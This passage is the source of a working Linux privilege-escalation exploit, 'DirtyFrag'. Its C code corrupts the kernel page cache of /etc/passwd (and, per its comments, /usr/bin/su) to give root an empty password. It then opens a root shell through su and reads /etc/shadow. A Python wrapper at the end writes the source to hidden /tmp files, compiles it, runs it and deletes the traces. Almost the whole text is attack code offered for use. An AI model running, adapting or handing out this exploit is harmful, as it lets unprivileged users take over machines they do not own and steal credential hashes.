static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
		pcheck_fn check,
		uint8_t K_out[8], uint8_t P_out[8],
		uint64_t seed_init,
		const char *label)
{
	fcrypt_uctx ctx;
	uint8_t K[8], P[8];
	uint64_t seed = seed_init;
	struct timespec ts0, ts1;
	clock_gettime(CLOCK_MONOTONIC, &ts0);

	for (uint64_t iter = 0; iter < max_iters; iter++) {
		uint64_t r = fc_splitmix64(&seed);
		memcpy(K, &r, 8);
		fcrypt_user_setkey(&ctx, K);
		fcrypt_user_decrypt(&ctx, P, C);

		if (check(P)) {
			memcpy(K_out, K, 8);
			memcpy(P_out, P, 8);
			clock_gettime(CLOCK_MONOTONIC, &ts1);
			double dt = (ts1.tv_sec - ts0.tv_sec) +
				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
			LOG("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
					label,
					(unsigned long)iter, dt, iter / dt / 1e6,
					K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
					P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
					(P[0]>=32&&P[0]<127)?P[0]:'.',
					(P[1]>=32&&P[1]<127)?P[1]:'.',
					(P[2]>=32&&P[2]<127)?P[2]:'.',
					(P[3]>=32&&P[3]<127)?P[3]:'.',
					(P[4]>=32&&P[4]<127)?P[4]:'.',
					(P[5]>=32&&P[5]<127)?P[5]:'.',
					(P[6]>=32&&P[6]<127)?P[6]:'.',
					(P[7]>=32&&P[7]<127)?P[7]:'.');
			return 0;
		}

		if ((iter & 0x3ffffff) == 0 && iter > 0) {
			clock_gettime(CLOCK_MONOTONIC, &ts1);
			double dt = (ts1.tv_sec - ts0.tv_sec) +
				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
			fprintf(stderr, "  [%s %.1fs] iter=%lu (%.2fM/s)\n",
					label, dt, (unsigned long)iter, iter / dt / 1e6);
		}
	}
	return -1;
}


int rxrpc_lpe_main(int argc, char **argv)
{
	fprintf(stderr, "\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===\n");
	fprintf(stderr, "[*] uid=%u euid=%u gid=%u\n",
			getuid(), geteuid(), getgid());

	{
		const char *no_unshare = getenv("POC_NO_UNSHARE");
		if (!no_unshare || *no_unshare != '1') {
			const char *do_unshare = getenv("POC_UNSHARE");
			if (do_unshare && *do_unshare == '1') {
				if (do_unshare_userns_netns() < 0) return 1;
			}
		}
	}

	/* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel module.
	 * Without this, the first add_key("rxrpc", ...) call fails with ENODEV
	 * because the kernel key type "rxrpc" is registered by rxrpc_init() in
	 * the module load path. */
	{
		int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
		if (dummy < 0) {
			WARN("socket(AF_RXRPC): %s — module not loadable?", strerror(errno));
			return 1;
		}
		close(dummy);
		LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
	}

	/* Open /etc/passwd RO and mmap the first page (which contains the
	 * root entry on line 1). */
	const char *target_path = getenv("POC_TARGET_FILE");
	if (!target_path || !*target_path) target_path = "/etc/passwd";

	int rfd_ro = open(target_path, O_RDONLY);
	if (rfd_ro < 0) {
		WARN("open %s RO: %s", target_path, strerror(errno));
		return 1;
	}
	struct stat st;
	fstat(rfd_ro, &st);
	if (st.st_size < 32) { WARN("target too small: %lld", (long long)st.st_size); return 1; }
	LOG("target %s opened RO, size=%lld, uid=%u gid=%u mode=%04o",
			target_path, (long long)st.st_size, st.st_uid, st.st_gid,
			st.st_mode & 07777);

	/* mmap first page so the page-cache page stays pinned. */
	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
	if (map == MAP_FAILED) { WARN("mmap: %s", strerror(errno)); return 1; }
	LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);

	/* If a previous attempt already left the root entry in the patched
	 * "root::0:0:..." form, treat as success and skip the brute-force /
	 * trigger stages.  Otherwise proceed regardless of current state —
	 * the brute-force re-derives K_A/K_B/K_C from whatever bytes are
	 * currently at offsets 4/6/8 of the page-cache page, so it works
	 * even on the corrupt residue from a previous failed run. */
	{
		const char *m = (const char *)map;
		if (memcmp(m, "root::0:0", 9) == 0) {
			LOG("/etc/passwd already patched (root::0:0...) — nothing to do");
			return 0;
		}
		LOG("/etc/passwd line 1 first 16 bytes:");
		for (int i = 0; i < 16; i++)
			fprintf(stderr, "%02x ", (uint8_t)m[i]);
		fprintf(stderr, "\n");
	}
	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
	for (int i = 0; i < 32; i++) {
		char c = ((const char *)map)[i];
		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
	}
	fprintf(stderr, "'\n");

	/* === STAGE 1 — THREE-SPLICE OFFLINE BRUTE FORCE ===
	 *
	 * Read THREE 8-byte ciphertexts at file offsets 4, 6, 8.  Search
	 * independently for K_A (chars 4-5 = "::"), K_B (chars 6-7 = "0:"),
	 * K_C (chars 8-15 = "0:GGGGGG:" with G non-control).  All searches
	 * are user-space only — no kernel/VM interaction.
	 *
	 * Last-write-wins ordering: trigger A first (covers 4..11), then B
	 * (covers 6..13 — overrides A's 6..11), then C (covers 8..15 —
	 * overrides A's 8..11 and B's 8..13).  Final state of chars 4..15:
	 *   chars 4..5  = P_A[0..1]
	 *   chars 6..7  = P_B[0..1]
	 *   chars 8..15 = P_C[0..7]
	 * =================================================================*/
	uint8_t Ca[8], Cb[8], Cc[8];
	int off_a = 4, off_b = 6, off_c = 8;
	if (pread(rfd_ro, Ca, 8, off_a) != 8) { WARN("pread Ca: %s", strerror(errno)); return 1; }
	if (pread(rfd_ro, Cb, 8, off_b) != 8) { WARN("pread Cb: %s", strerror(errno)); return 1; }
	if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("pread Cc: %s", strerror(errno)); return 1; }

	LOG("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_a, Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
			(Ca[0]>=32&&Ca[0]<127)?Ca[0]:'.', (Ca[1]>=32&&Ca[1]<127)?Ca[1]:'.',
			(Ca[2]>=32&&Ca[2]<127)?Ca[2]:'.', (Ca[3]>=32&&Ca[3]<127)?Ca[3]:'.',
			(Ca[4]>=32&&Ca[4]<127)?Ca[4]:'.', (Ca[5]>=32&&Ca[5]<127)?Ca[5]:'.',
			(Ca[6]>=32&&Ca[6]<127)?Ca[6]:'.', (Ca[7]>=32&&Ca[7]<127)?Ca[7]:'.');
	LOG("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_b, Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
			(Cb[0]>=32&&Cb[0]<127)?Cb[0]:'.', (Cb[1]>=32&&Cb[1]<127)?Cb[1]:'.',
			(Cb[2]>=32&&Cb[2]<127)?Cb[2]:'.', (Cb[3]>=32&&Cb[3]<127)?Cb[3]:'.',
			(Cb[4]>=32&&Cb[4]<127)?Cb[4]:'.', (Cb[5]>=32&&Cb[5]<127)?Cb[5]:'.',
			(Cb[6]>=32&&Cb[6]<127)?Cb[6]:'.', (Cb[7]>=32&&Cb[7]<127)?Cb[7]:'.');
	LOG("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_c, Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
			(Cc[0]>=32&&Cc[0]<127)?Cc[0]:'.', (Cc[1]>=32&&Cc[1]<127)?Cc[1]:'.',
			(Cc[2]>=32&&Cc[2]<127)?Cc[2]:'.', (Cc[3]>=32&&Cc[3]<127)?Cc[3]:'.',
			(Cc[4]>=32&&Cc[4]<127)?Cc[4]:'.', (Cc[5]>=32&&Cc[5]<127)?Cc[5]:'.',
			(Cc[6]>=32&&Cc[6]<127)?Cc[6]:'.', (Cc[7]>=32&&Cc[7]<127)?Cc[7]:'.');

	fcrypt_init_sboxes();
	/* selftest */
	{
		fcrypt_uctx ctx;
		uint8_t z[8] = {0};
		uint8_t cv[8] = { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41 };
		uint8_t pv[8];
		fcrypt_user_setkey(&ctx, z);
		fcrypt_user_decrypt(&ctx, pv, cv);
		if (memcmp(pv, z, 8) != 0) { WARN("fcrypt selftest FAILED"); return 1; }
	}
	LOG("fcrypt selftest OK");

	uint8_t Ka[8], Pa_out[8];
	uint8_t Kb[8], Pb_out[8];
	uint8_t Kc[8], Pc_out[8];
	uint8_t Cb_actual[8], Cc_actual[8];

	{
		uint64_t max_iters = 10000000000ULL;
		const char *e = getenv("LPE_MAX_ITERS");
		if (e) max_iters = strtoull(e, NULL, 0);
		uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
		const char *se = getenv("LPE_SEED");
		if (se) seed_base = strtoull(se, NULL, 0);

		fprintf(stderr, "\n=== STAGE 1a: search K_A (chars 4-5 := \"::\")  prob ~1.5e-5 ===\n");
		if (find_K_offline_generic(Ca, max_iters, fc_check_pa_nullok,
					Ka, Pa_out, seed_base, "K_A") != 0) {
			WARN("K_A search exhausted"); return 2;
		}

		/* After splice A is applied, the ciphertext that splice B will
		 * see at file offset 6 is NOT the original Cb — it's the bytes
		 * that splice A wrote to file offsets 6..11 (= Pa[2..7]) plus
		 * the original bytes 12..13 (= Cb[6..7]).  We must derive
		 * Cb_actual and search K_B against it. */
		memcpy(Cb_actual, Pa_out + 2, 6);
		memcpy(Cb_actual + 6, Cb + 6, 2);
		LOG("Cb_actual (after splice A) = %02x%02x%02x%02x%02x%02x%02x%02x",
				Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
				Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);

		fprintf(stderr, "\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\")  prob ~1.5e-5 ===\n");
		if (find_K_offline_generic(Cb_actual, max_iters, fc_check_pb_nullok,
					Kb, Pb_out, seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,
					"K_B") != 0) {
			WARN("K_B search exhausted"); return 2;
		}

		/* Same chaining logic for splice C: after splice B, file offsets
		 * 8..13 hold Pb[2..7]; offsets 14..15 still hold the original
		 * bytes Cc[6..7]. */
		memcpy(Cc_actual, Pb_out + 2, 6);
		memcpy(Cc_actual + 6, Cc + 6, 2);
		LOG("Cc_actual (after splice B) = %02x%02x%02x%02x%02x%02x%02x%02x",
				Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
				Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);

		fprintf(stderr, "\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
		if (find_K_offline_generic(Cc_actual, max_iters, fc_check_pc_nullok,
					Kc, Pc_out, seed_base ^ 0x5a5a5a5a5a5a5a5aULL,
					"K_C") != 0) {
			WARN("K_C search exhausted"); return 2;
		}
	}

	fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line 1:\n    \"root");
	/* chars 4-5 from P_A */
	for (int i = 0; i < 2; i++) fputc((Pa_out[i]>=32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
	/* chars 6-7 from P_B */
	for (int i = 0; i < 2; i++) fputc((Pb_out[i]>=32&&Pb_out[i]<127)?Pb_out[i]:'.', stderr);
	/* chars 8-15 from P_C */
	for (int i = 0; i < 8; i++) fputc((Pc_out[i]>=32&&Pc_out[i]<127)?Pc_out[i]:'.', stderr);
	fprintf(stderr, "/root:/bin/bash\"\n");

	/* === STAGE 2 — THREE KERNEL TRIGGERS (in order A → B → C) ===
	 * Each trigger does a single in-place decrypt at the
	 * indicated /etc/passwd file offset.  Last-write-wins on overlapping
	 * bytes determines the final state.
	 */
	fprintf(stderr, "\n=== STAGE 2a: kernel trigger A @ off %d (set chars 4-5 \"::\") ===\n", off_a);
	memcpy(SESSION_KEY, Ka, 8);
	if (do_one_trigger(rfd_ro, off_a, 8) < 0) {
		WARN("kernel trigger A failed"); return 3;
	}

	fprintf(stderr, "\n=== STAGE 2b: kernel trigger B @ off %d (set chars 6-7 \"0:\") ===\n", off_b);
	memcpy(SESSION_KEY, Kb, 8);
	if (do_one_trigger(rfd_ro, off_b, 8) < 0) {
		WARN("kernel trigger B failed"); return 3;
	}

	fprintf(stderr, "\n=== STAGE 2c: kernel trigger C @ off %d (set chars 8-15 \"0:GGGGGG:\") ===\n", off_c);
	memcpy(SESSION_KEY, Kc, 8);
	if (do_one_trigger(rfd_ro, off_c, 8) < 0) {
		WARN("kernel trigger C failed"); return 3;
	}

	/* Verify: re-read line 1 of /etc/passwd via mmap. */
	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
	for (int i = 0; i < 32; i++) {
		char c = ((const char *)map)[i];
		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
	}
	fprintf(stderr, "'\n");

	/* Sanity-check: chars 4-5 = "::", 6-7 = "0:", 8-9 = "0:", 15 = ':'. */
	{
		const char *m = (const char *)map;
		int ok = (m[4] == ':' && m[5] == ':' &&
				m[6] == '0' && m[7] == ':' &&
				m[8] == '0' && m[9] == ':' &&
				m[15] == ':');
		if (!ok) {
			WARN("post-trigger sanity check failed — char layout off");
			return 4;
		}
	}
	fprintf(stderr,
			"\n[!!!] HIT — root entry now has empty passwd field, uid=0, "
			"gid=0, dir=/root, shell=/bin/bash.\n");

	/* === STAGE 3 — VERIFY VIA getent passwd root === */
	fprintf(stderr,
			"\n=== STAGE 3: independent verify via `getent passwd root` ===\n");
	{
		int p[2];
		if (pipe(p) == 0) {
			pid_t pid = fork();
			if (pid == 0) {
				close(p[0]);
				dup2(p[1], 1);
				dup2(p[1], 2);
				close(p[1]);
				execlp("getent", "getent", "passwd", "root", NULL);
				_exit(127);
			}
			close(p[1]);
			char buf[1024];
			ssize_t r = read(p[0], buf, sizeof(buf) - 1);
			close(p[0]);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
			if (r > 0) {
				buf[r] = 0;
				fprintf(stderr, "[getent passwd root] %s", buf);
			}
			fprintf(stderr,
					"[+] PRIMITIVE proven: root entry has empty passwd field "
					"via NSS.\n");
		}
	}

	/* Honour `--corrupt-only` arg or DIRTYFRAG_CORRUPT_ONLY=1 env so
	 * the chain wrapper can skip the in-process su PTY stage and exec
	 * /usr/bin/su itself.  Avoids the flaky posix_openpt bridge. */
	{
		int co_flag = 0;
		for (int i = 1; i < argc; i++)
			if (!strcmp(argv[i], "--corrupt-only")) { co_flag = 1; break; }
		const char *e = getenv("DIRTYFRAG_CORRUPT_ONLY");
		if (e && *e == '1') co_flag = 1;
		if (co_flag) return 0;
	}

	/* === STAGE 4 — `su` (target=root, no password input) ===
	 * PAM common-auth contains "auth [success=2 default=ignore]
	 * pam_unix.so nullok" — so a target user with empty passwd field
	 * + nullok flag accepts an empty password.  We auto-inject a
	 * single newline on the "Password:" prompt and then bridge the
	 * resulting bash to the user's tty. */
	fprintf(stderr,
			"\n=== STAGE 4: spawning interactive root shell via `su` "
			"(no password input needed) ===\n\n");
	fflush(stderr);

	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0) {
		WARN("posix_openpt: %s", strerror(errno));
		return 5;
	}
	char *slave_name = ptsname(master);

	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0) {
		ioctl(master, TIOCSWINSZ, &ws);
	}

	pid_t pid = fork();
	if (pid < 0) { WARN("fork: %s", strerror(errno)); return 5; }
	if (pid == 0) {
		/* child */
		setsid();
		int slave = open(slave_name, O_RDWR);
		if (slave < 0) _exit(127);
		ioctl(slave, TIOCSCTTY, 0);
		dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
		if (slave > 2) close(slave);
		close(master);
		/* `su` with no args targets root.  PAM common-auth's pam_unix.so
		 * nullok accepts the empty passwd we planted in /etc/passwd. */
		execlp("su", "su", NULL);
		_exit(127);
	}

	/* parent: bridge user's tty <-> master. */
	struct termios saved_termios;
	int saved_termios_ok = (tcgetattr(STDIN_FILENO, &saved_termios) == 0);
	if (saved_termios_ok) {
		struct termios raw = saved_termios;
		cfmakeraw(&raw);
		tcsetattr(STDIN_FILENO, TCSANOW, &raw);
	}

	int auto_pw_sent = 0;
	int stdin_eof = 0;          /* set when stdin closes (e.g. /dev/null) */
	char buf[4096];
	/* If LPE_AUTO_VERIFY=1 is set, the bridge will inject
	 * `id; whoami; exit\n` so it can prove uid=0 non-interactively
	 * (e.g. when stdin is /dev/null in CI). */
	int auto_verify = 0;
	{
		const char *e = getenv("LPE_AUTO_VERIFY");
		if (e && *e == '1') auto_verify = 1;
	}
	int verify_sent = 0;
	int total_ms = 0;
	for (;;) {
		struct pollfd pfds[2] = {
			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
			{ master,       POLLIN, 0 },
		};
		int pr = poll(pfds, 2, 200);
		if (pr < 0 && errno != EINTR) break;
		total_ms += 200;

		if (pfds[1].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0) break;
			(void)write(STDOUT_FILENO, buf, n);
			if (!auto_pw_sent && (size_t)n < sizeof(buf)) {
				buf[n] = 0;
				if (strstr(buf, "Password") || strstr(buf, "password")) {
					/* Empty password — PAM nullok will accept it.
					 * (When pam_unix sees an empty passwd field plus
					 * nullok it skips the prompt entirely; this branch
					 * handles the case where some other PAM module
					 * prints a prompt anyway.) */
					(void)write(master, "\n", 1);
					auto_pw_sent = 1;
				}
			}
		}
		if (!stdin_eof && (pfds[0].revents & POLLIN)) {
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0) {
				/* stdin EOF — stop reading from it but keep bridging
				 * master → stdout so su can still finish auth and run
				 * the optional auto-verify command. */
				stdin_eof = 1;
			} else {
				(void)write(master, buf, n);
			}
		}
		if (pfds[1].revents & (POLLHUP | POLLERR)) break;

		/* Auto-verify: ~1 s after spawn, send `id; whoami; exit\n` so
		 * the bridge captures uid=0 evidence non-interactively even
		 * when pam_unix's blank-passwd path skips the prompt. */
		if (auto_verify && !verify_sent && total_ms >= 1000) {
			const char cmd[] = "id; whoami; cat /etc/shadow | head -2; exit\n";
			(void)write(master, cmd, sizeof(cmd) - 1);
			verify_sent = 1;
		}

		int status;
		pid_t w = waitpid(pid, &status, WNOHANG);
		if (w == pid) {
			for (int i = 0; i < 5; i++) {
				struct pollfd pf = { master, POLLIN, 0 };
				if (poll(&pf, 1, 50) <= 0) break;
				ssize_t n = read(master, buf, sizeof(buf));
				if (n <= 0) break;
				(void)write(STDOUT_FILENO, buf, n);
			}
			break;
		}
	}
	if (saved_termios_ok) {
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
	}
	close(master);
	return 0;
}
/*
 * DirtyFrag chain — uid=1000 → root.
 *
 * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
 *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
 *    shell ELF.  Works on every distro tested regardless of PAM nullok
 *    or /etc/passwd contents — once invoked, the patched setuid-root
 *    /usr/bin/su just execs /bin/sh as uid 0.
 *
 * 2. rxrpc path  (Ubuntu fallback): if AF_ALG is sandboxed and the ESP
 *    path can't reach the page cache, fall back to the rxrpc/rxkad
 *    nullok primitive that patches /etc/passwd's root entry empty.
 *    PAM nullok then accepts the empty password during `su -`.
 *
 * 3. Once either target is corrupted, spawn `/usr/bin/su -` inside a
 *    fresh PTY and bridge the user's tty to it.  The bridge handles
 *    both the patched-su (no PAM at all) and the patched-passwd (PAM
 *    nullok) cases uniformly, and works even when the caller is in a
 *    background process group of an ssh-allocated PTY.
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>

extern int su_lpe_main(int argc, char **argv);
extern int rxrpc_lpe_main(int argc, char **argv);

/*
 * The 8 bytes our su payload places at file offset 0x78 — the first
 * instructions of the embedded shell ELF.  Sequence:
 *   31 ff   xor edi, edi
 *   31 f6   xor esi, esi
 *   31 c0   xor eax, eax
 *   b0 6a   mov al, 0x6a   (setgid)
 * Distros' original /usr/bin/su has different bytes here, so this is
 * a reliable post-patch marker.
 *
 * (We don't check offset 0 because /usr/bin/su already has the ELF
 * magic there — both before and after we patch.)
 */
static const uint8_t su_marker[8] = {
	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
};

static int su_already_patched(void)
{
	int fd = open("/usr/bin/su", O_RDONLY);
	if (fd < 0)
		return 0;
	uint8_t got[8];
	ssize_t n = pread(fd, got, sizeof(got), 0x78);
	close(fd);
	if (n != sizeof(got))
		return 0;
	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
}

static int passwd_already_patched(void)
{
	int fd = open("/etc/passwd", O_RDONLY);
	if (fd < 0)
		return 0;
	char head[16];
	ssize_t n = pread(fd, head, sizeof(head), 0);
	close(fd);
	if (n < 9)
		return 0;
	return memcmp(head, "root::0:0", 9) == 0;
}

static int either_target_patched(void)
{
	return su_already_patched() || passwd_already_patched();
}

static void silence_stderr(int *saved_fd)
{
	*saved_fd = dup(STDERR_FILENO);
	int dn = open("/dev/null", O_WRONLY);
	if (dn >= 0) {
		dup2(dn, STDERR_FILENO);
		close(dn);
	}
}

static void restore_stderr(int saved_fd)
{
	if (saved_fd >= 0) {
		dup2(saved_fd, STDERR_FILENO);
		close(saved_fd);
	}
}

static char **append_corrupt_only(int argc, char **argv, int *new_argc)
{
	static char *flag = "--corrupt-only";
	static char *buf[64];
	int n = argc < 60 ? argc : 60;
	for (int i = 0; i < n; i++)
		buf[i] = argv[i];
	buf[n] = flag;
	buf[n + 1] = NULL;
	*new_argc = n + 1;
	return buf;
}

static void exec_su_login(void)
{
	const char *paths[] = {
		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
	};
	for (int i = 0; paths[i]; i++)
		execl(paths[i], "su", "-", (char *)NULL);
	execlp("su", "su", "-", (char *)NULL);
}

/*
 * Spawn `/usr/bin/su -` in a fresh PTY and bridge our tty to it.
 */
static int run_root_pty(void)
{
	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0)
		return -1;
	if (grantpt(master) < 0 || unlockpt(master) < 0) {
		close(master);
		return -1;
	}
	char *slave_name = ptsname(master);
	if (!slave_name) {
		close(master);
		return -1;
	}

	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0)
		ioctl(master, TIOCSWINSZ, &ws);

	pid_t pid = fork();
	if (pid < 0) {
		close(master);
		return -1;
	}
	if (pid == 0) {
		setsid();
		int slave = open(slave_name, O_RDWR);
		if (slave < 0)
			_exit(127);
		ioctl(slave, TIOCSCTTY, 0);
		dup2(slave, 0);
		dup2(slave, 1);
		dup2(slave, 2);
		if (slave > 2)
			close(slave);
		close(master);
		exec_su_login();
		_exit(127);
	}

	signal(SIGTTOU, SIG_IGN);
	signal(SIGTTIN, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);
	signal(SIGHUP,  SIG_IGN);
	(void)setpgid(0, 0);
	(void)tcsetpgrp(STDIN_FILENO, getpid());

	struct termios saved_termios;
	int restore_termios = 0;
	if (tcgetattr(STDIN_FILENO, &saved_termios) == 0) {
		struct termios raw = saved_termios;
		cfmakeraw(&raw);
		if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == 0)
			restore_termios = 1;
	}

	int auto_pw_sent = 0;
	int stdin_eof = 0;
	int saw_master_output = 0;
	int total_ms = 0;
	char buf[4096];

	for (;;) {
		struct pollfd pfds[2] = {
			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
			{ master,                        POLLIN, 0 },
		};
		int pr = poll(pfds, 2, 200);
		if (pr < 0 && errno != EINTR)
			break;
		total_ms += 200;

		if (pfds[1].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0)
				break;
			saw_master_output = 1;
			(void)write(STDOUT_FILENO, buf, n);
			if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
				buf[n] = 0;
				if (strstr(buf, "Password") ||
						strstr(buf, "password")) {
					(void)write(master, "\n", 1);
					auto_pw_sent = 1;
				}
			}
		}
		if (!stdin_eof && (pfds[0].revents & POLLIN)) {
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0)
				stdin_eof = 1;
			else
				(void)write(master, buf, n);
		}
		if (pfds[1].revents & (POLLHUP | POLLERR))
			break;

		if (!auto_pw_sent && !saw_master_output && total_ms >= 1500) {
			(void)write(master, "\n", 1);
			auto_pw_sent = 1;
		}

		int status;
		pid_t w = waitpid(pid, &status, WNOHANG);
		if (w == pid) {
			for (int i = 0; i < 5; i++) {
				struct pollfd pf = { master, POLLIN, 0 };
				if (poll(&pf, 1, 50) <= 0)
					break;
				ssize_t n = read(master, buf, sizeof(buf));
				if (n <= 0)
					break;
				(void)write(STDOUT_FILENO, buf, n);
			}
			break;
		}
	}

	if (restore_termios)
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
	close(master);
	return 0;
}

int main(int argc, char **argv)
{
	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
	int force_esp = 0, force_rxrpc = 0;
	int saved_err = -1;
	int rc = 1;
	int new_argc;
	char **co_argv;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--force-esp"))
			force_esp = 1;
		else if (!strcmp(argv[i], "--force-rxrpc"))
			force_rxrpc = 1;
		else if (!strcmp(argv[i], "-v") ||
				!strcmp(argv[i], "--verbose"))
			verbose = 1;
	}

	if (getuid() == 0) {
		execlp("/bin/bash", "bash", (char *)NULL);
		_exit(1);
	}

	co_argv = append_corrupt_only(argc, argv, &new_argc);

	if (!verbose)
		silence_stderr(&saved_err);

	if (force_rxrpc) {
		rc = rxrpc_lpe_main(new_argc, co_argv);
		for (int i = 0; !passwd_already_patched() && i < 3; i++)
			rc = rxrpc_lpe_main(new_argc, co_argv);
	} else if (force_esp) {
		rc = su_lpe_main(new_argc, co_argv);
	} else {
		rc = su_lpe_main(new_argc, co_argv);
		if (!su_already_patched()) {
			rc = rxrpc_lpe_main(new_argc, co_argv);
			for (int i = 0; !passwd_already_patched() && i < 3; i++)
				rc = rxrpc_lpe_main(new_argc, co_argv);
		}
	}

	int patched = either_target_patched();

	if (!verbose)
		restore_stderr(saved_err);

	if (patched) {
		(void)run_root_pty();
		return 0;
	}

	dprintf(2, "dirtyfrag: failed (rc=%d)\n", rc);
	return rc ? rc : 1;
}
'''
# ═══════════════════════════════════════════════════════════════
# ▲▲▲ SELESAI AREA SOURCE C ▲▲▲
# ═══════════════════════════════════════════════════════════════


def _check_su_patched():
    marker = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
    try:
        with open("/usr/bin/su", "rb") as f:
            f.seek(0x78)
            return f.read(8) == marker
    except (OSError, PermissionError):
        return False


def _check_passwd_patched():
    try:
        with open("/etc/passwd", "r") as f:
            return f.readline().startswith("root::0:0")
    except (OSError, PermissionError):
        return False


def _dirtyfrag_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _dirtyfrag_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.df_%s.c" % tag
    bin_path = "/tmp/.df_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(DIRTYFRAG_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-pthread", "-w", "-o", bin_path, c_path],
            capture_output=True, timeout=120
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _dirtyfrag_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _dirtyfrag_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _dirtyfrag_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running DirtyFrag (timeout 1200s)...")
    try:
        r = subprocess.run([bin_path], capture_output=True, timeout=1200)
        out = (r.stdout or b"") + (r.stderr or b"")
        out_s = out.decode(errors="replace")
        if out_s:
            for line in out_s.splitlines()[-20:]:
                log("    %s" % line)
    except subprocess.TimeoutExpired:
        log("[-] timeout")
        _dirtyfrag_cleanup(c_path, bin_path)
        return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _dirtyfrag_cleanup(c_path, bin_path)
        return False

    _dirtyfrag_cleanup(c_path, bin_path)

    if _check_su_patched() or _check_passwd_patched():
        return True
    if "uid=0(root)" in out_s:
        return True
    return False


